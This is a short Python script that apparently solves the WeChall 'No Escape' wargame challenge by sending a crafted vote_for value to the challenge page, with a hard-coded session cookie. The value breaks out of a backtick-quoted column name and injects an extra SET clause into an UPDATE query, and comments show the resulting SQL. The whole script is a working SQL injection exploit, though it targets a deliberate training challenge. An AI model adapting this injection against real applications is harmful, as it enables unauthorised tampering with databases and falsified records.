import requests

cookies = {"WC": "11068160-37667-z1PuydshfLuLpXFI"}
url = "https://www.wechall.net/challenge/no_escape/index.php?vote_for="
# "UPDATE noescvotes SET `$who`=`$who`+1 WHERE id=1";
# SET `bill`=111,`george`=`george`= `bill`=111,`george`=`george` + 1
vote_for = "bill`=111,`george`=`george"
url += vote_for
r = requests.get(url, cookies=cookies)
print r.text
